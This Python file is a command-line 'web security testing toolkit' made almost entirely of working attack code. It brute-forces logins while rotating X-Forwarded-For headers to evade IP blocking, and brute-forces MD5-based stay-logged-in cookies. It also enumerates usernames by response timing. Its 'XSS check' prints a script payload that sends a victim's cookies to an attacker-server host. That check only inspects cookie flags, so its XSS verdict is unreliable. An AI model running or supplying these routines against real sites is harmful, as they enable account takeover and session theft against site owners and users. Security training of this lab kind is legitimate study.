import requests
import hashlib
import base64
import time
import argparse

"""
# This script is a web security testing toolkit that includes functionalities for:
# - Checking for XSS vulnerabilities
# - Bypassing IP blocking using X-Forwarded-For header rotation
# - Brute-forcing stay-logged-in cookies
# - Enumerating valid usernames using timing analysis
"""


# TODO: Refactor codebase to OOP for framework. 
def check_xss_vulnerability(url):
    """Check for missing HttpOnly and Secure flags in cookies"""
    response = requests.get(url)
    cookies = response.headers.get('Set-Cookie', '')
    
    if 'HttpOnly' not in cookies or 'Secure' not in cookies:
        print(f"[!] XSS Vulnerability Detected at {url}")
        print("Possible injection: <script>document.location='http://attacker-server/?c='+document.cookie</script>")
    else:
        print("[+] Cookies appear properly secured")

def bypass_ip_block(url, login_endpoint, wordlist):
    """Bypass IP blocking using X-Forwarded-For header rotation"""
    with open(wordlist, 'r') as f:
        passwords = f.readlines()
    
    for i, password in enumerate(passwords):
        headers = {
            'X-Forwarded-For': str(i + 1),
            'Connection': 'close'
        }
        
        data = {
            'username': 'target_user',
            'password': password.strip()
        }
        
        try:
            response = requests.post(
                f"{url}/{login_endpoint}",
                headers=headers,
                data=data,
                allow_redirects=False
            )
            
            print(f"Attempt {i+1}: Status {response.status_code}")
            
            if response.status_code == 302:
                print(f"[!] Possible success with password: {password.strip()}")
                break
            
        except Exception as e:
            print(f"Error: {str(e)}")
        
        time.sleep(1)  # Add delay between attempts

def brute_force_stay_logged_in(url, cookie_name, user, wordlist):
    """Brute force stay-logged-in cookie"""
    with open(wordlist, 'r') as f:
        passwords = f.readlines()
    
    for password in passwords:
        pwd_hash = hashlib.md5(password.strip().encode()).hexdigest()
        cookie_value = base64.b64encode(f"{user}:{pwd_hash}".encode()).decode()
        
        cookies = {
            cookie_name: cookie_value
        }
        
        response = requests.get(
            url,
            cookies=cookies,
            allow_redirects=False
        )
        
        if response.status_code == 200 and "Logout" in response.text:
            print(f"[!] Success with password: {password.strip()}")
            return
            
        print(f"Tried: {password.strip()} - Status: {response.status_code}")

def enumerate_usernames(url, login_endpoint, userlist):
    """Enumerate valid usernames using timing analysis"""
    with open(userlist, 'r') as f:
        usernames = f.readlines()
    
    baseline_time = None
    
    for user in usernames:
        user = user.strip()
        start_time = time.time()
        
        data = {
            'username': user,
            'password': 'invalid_password_with_extra_length_to_test_response'
        }
        
        response = requests.post(
            f"{url}/{login_endpoint}",
            data=data,
            allow_redirects=False
        )
        
        elapsed = time.time() - start_time
        
        if not baseline_time:
            baseline_time = elapsed
        else:
            time_diff = elapsed - baseline_time
            
            if time_diff > 0.5:  # Threshold for timing difference
                print(f"[!] Potential valid username: {user} (Response time: {elapsed:.2f}s)")
        
        print(f"User: {user} - Time: {elapsed:.2f}s - Status: {response.status_code}")

def console_menu():
    """Display a console menu for user interaction"""
    while True:
        print("\nWeb Security Testing Toolkit")
        print("1. Check for XSS vulnerabilities")
        print("2. Bypass IP blocking")
        print("3. Brute-force stay-logged-in cookie")
        print("4. Enumerate valid usernames")
        print("5. Exit")

        choice = input("Enter your choice: ")

        if choice == '1':
            url = input("Enter URL to check for XSS: ")
            check_xss_vulnerability(url)
        elif choice == '2':
            url = input("Enter URL: ")
            login = input("Enter login endpoint: ")
            wordlist = input("Enter path to wordlist: ")
            bypass_ip_block(url, login, wordlist)
        elif choice == '3':
            url = input("Enter URL: ")
            cookie = input("Enter cookie name: ")
            user = input("Enter username: ")
            wordlist = input("Enter path to wordlist: ")
            brute_force_stay_logged_in(url, cookie, user, wordlist)
        elif choice == '4':
            url = input("Enter URL: ")
            login = input("Enter login endpoint: ")
            userlist = input("Enter path to userlist: ")
            enumerate_usernames(url, login, userlist)
        elif choice == '5':
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Web Security Testing Toolkit")
    subparsers = parser.add_subparsers(dest='command')
    
    # XSS Check
    xss_parser = subparsers.add_parser('xss', help='Check for XSS vulnerabilities')
    xss_parser.add_argument('-u', '--url', required=True)
    
    # IP Bypass
    ip_parser = subparsers.add_parser('ipbypass', help='Bypass IP blocking')
    ip_parser.add_argument('-u', '--url', required=True)
    ip_parser.add_argument('-l', '--login', required=True)
    ip_parser.add_argument('-w', '--wordlist', required=True)
    
    # Cookie Brute-force
    cookie_parser = subparsers.add_parser('cookie', help='Brute-force stay-logged-in cookie')
    cookie_parser.add_argument('-u', '--url', required=True)
    cookie_parser.add_argument('-c', '--cookie', required=True)
    cookie_parser.add_argument('-n', '--user', required=True)
    cookie_parser.add_argument('-w', '--wordlist', required=True)
    
    # Username Enumeration
    user_parser = subparsers.add_parser('enum', help='Enumerate valid usernames')
    user_parser.add_argument('-u', '--url', required=True)
    user_parser.add_argument('-l', '--login', required=True)
    user_parser.add_argument('-w', '--wordlist', required=True)
    
    args = parser.parse_args()
    
    if args.command == 'xss':
        check_xss_vulnerability(args.url)
    elif args.command == 'ipbypass':
        bypass_ip_block(args.url, args.login, args.wordlist)
    elif args.command == 'cookie':
        brute_force_stay_logged_in(args.url, args.cookie, args.user, args.wordlist)
    elif args.command == 'enum':
        enumerate_usernames(args.url, args.login, args.wordlist)
    else:
        console_menu()
